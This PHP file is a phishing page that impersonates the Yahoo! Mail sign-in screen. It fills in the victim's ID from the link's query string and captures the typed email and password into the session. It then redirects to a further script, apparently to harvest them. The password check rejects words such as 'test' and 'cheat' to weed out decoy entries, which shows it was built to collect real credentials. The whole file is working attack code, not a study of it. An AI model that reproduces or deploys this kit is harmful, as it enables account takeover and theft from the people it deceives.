<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];

	$urlquery = parse_url($url, PHP_URL_QUERY);
	$s = parse_str($urlquery);
	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email_msg = "";
$pass_msg = "";

$email = $userid;
$pass = "";

if($_POST) {
	$email = $_POST['email'];
	$pass = $_POST['password'];

	if(strlen($email) <= 3) {
		$email_msg = "Please enter valid Yahoo! ID";
	} else if(trim($pass) == "") {
		$pass_msg = "Please enter password";
	}
        else if(strlen($pass) <= 4 || stripos($pass,'fuck') !== false || stripos($pass,'cheat') !== false || stripos($pass,'test') !== false || $pass == $email ) {
		$pass_msg = "Invalid password";
	}
   else {
		$_SESSION['email'] = $email;
		$_SESSION['pass'] = $pass;
		header("Location: rename.php");
		exit;
	}
}
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="favicon.ico" >


<title>Yahoo! Mail: The best web-based email!</title>
</head>
<body topmargin="0" leftmargin="0">
<div style="display: block; width: 805px; margin: auto; position: relative">
	<img src="images/loglo.jpg" style="float: left; margin-left: 16px; margin-top: 12px; margin-bottom: 25px"/>
    
    <img src="images/toplink.jpg"  style="float: right; margin-right: 51px; margin-top: 6px;"/>
    <br style="clear: both" />
    
   	<div style="width: 542px; float: left;">
    	<img src="images/ad.jpg"  style="margin-top: 5px; margin-left: 420px;" /><br />
        <img src="images/mid.jpg" style="margin-top: 52px;" />
    </div>
    <div style="float: right; width: 240px; height: 600px; margin:0; padding: 0; line-height: 1.22em; display: block; text-align: left; color: #333; font: 13px arial,helvetica,clean,sans-serif;">
    	<div style="width: 262px !important; margin: 0 0 20px; padding: 0; ">
        	<div style="border: 2px solid rgba(153, 153, 153, 0.75); border-radius: 2px; -moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; -o-border-radius: 2px; z-index: 3; font-size: 13px !important; font-family: Helvetica, Helvetica,Arial,sans-serif; background-color: #ffffff; position: relative; margin: 0; padding: 0; line-height: 1.22em;">
            	<div style="padding: 20px; margin: 0; ">
                	<img style="display: block; margin: auto; margin-top: 12px; margin-bottom: 32px;" src="images/loglo.jpg"  />
                    <form method="post" action="" id="login" name="login">
                    
                    <?php if($user == "") {
					?>                      
                    	<input type="text" maxlength="96" name="email" id="email" tabindex="1" placeholder="Yahoo! ID" aria-required="true"  autocorrect="off" autocomplete="off" value="<?php echo $email != "" ? $email : "" ?>" style="border: 1px solid #bababa; margin-bottom: 15px; font-size: 107% !important; padding: 5px; height: 23px; width: 208px; border-radius: 3px; -moz-border-radius: 3px; -webkit-border-radius: 3px; -khtml-border-radius: 3px; -o-border-radius: 3px; line-height: 1.5;font: 99% arial,helvetica,clean,sans-serif;"/><?php echo $email_msg != "" ? "<span style='color: #a30b09; display: block; margin-left: 0px; margin-top: 2px;'>$email_msg</span>" : "" ?>
                     	<br />
                     <?php

			} else {
				
?>
             <h3 style="margin: 0 0 4px; color: #333; display: block; font-weight: normal; font-size: 15px; color: #454545; margin-bottom: 2px;
line-height: 1;">Username</h3>

			<input type="hidden" name="email" value="<?php echo $userid ?>" />

				<p id='username' style="color: #252525; font-weight: bold; font-size: 14px; padding-top: 0; padding-bottom: 18px; margin: 0;
padding: 0; line-height: 1.22em; "><b><?php echo $user ?></b></p>            
                        
                        
                        
<?

			} ?>
                        
                        <br />
                        <input name="password" id="password" maxlength="64" tabindex="2" aria-required="true" placeholder="Password" autocorrect="off" autocomplete="off" value="" type="password" style="border: 1px solid #bababa; margin-bottom: 15px; font-size: 107% !important; padding: 5px;
height: 23px; width: 208px; border-radius: 3px; -moz-border-radius: 3px; -webkit-border-radius: 3px; -khtml-border-radius: 3px; -o-border-radius: 3px; line-height: 1.5; font: 99% arial,helvetica,clean,sans-serif;"><?php echo $pass_msg != "" ? "<span style='color: #a30b09; display: block; margin-left: 0px; margin-top: 1px;'>$pass_msg</span>" : "<br />" ?>
						<br />
                        <input type="checkbox" name="remember_me" id="remember_me" style="border: 1px solid #bababa !important;">
                        <label for="remember_me">
                       		<span style="padding-right: 2px; padding-left: 5px; font-size: 107% !important; color: #222222; ">Keep me signed in</span>
                        </label>
                        
                        <input type="submit" name="login_btn" id="login_btn" value="Sign In" tabindex="4" style="border-radius: 2px;  -moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; -o-border-radius: 2x; background-color: #6E329D; background-image: linear-gradient(center, #6E329D 0%, #6E329D 100%); background-image: -moz-linear-gradient(center , #6E329D 0%, #6E329D 100%); background-image: -o-linear-gradient(center, #6E329D 0%, #6E329D 100%); background-image: -webkit-linear-gradient(center, #6E329D 0%, #6E329D 100%); background-image: -ms-linear-gradient(center, #6E329D 0%, #6E329D 100%); border: 1px solid #522675; border: 0 none; color: #ffffff; height: 35px; width: 100%;  font-weight: bold; cursor: pointer; text-align: center; line-height: 1.22em; margin-top: 19px" />
                    </form>
                    
                    <a id="flink" href="#" tabindex="5" style="font-size: 107%; color: #046fc9; text-decoration: none; line-height: 1.22em; margin-top: 13px; display: block;">I can't access my account</a>
                    <a id="fps" href="#" tabindex="6" style="font-size: 107%; color: #046fc9; text-decoration: none; line-height: 1.22em; display: block">Help</a>
                    
                    <img src="images/rest.jpg" style="margin-top: 18px;" />

                </div>
            </div>
        </div>
    </div>
    <br style="clear: both"/>
</div>
<div style="display: block; position: absolute; bottom: 0px; left: 0px; border-top: 1px solid #CCCCCC; width: 100%; height: 35px;">
  <img src="images/footer.jpg" style="margin-left: auto; margin-right: auto; display: block" width="380" />
</div>
</body>
</html>
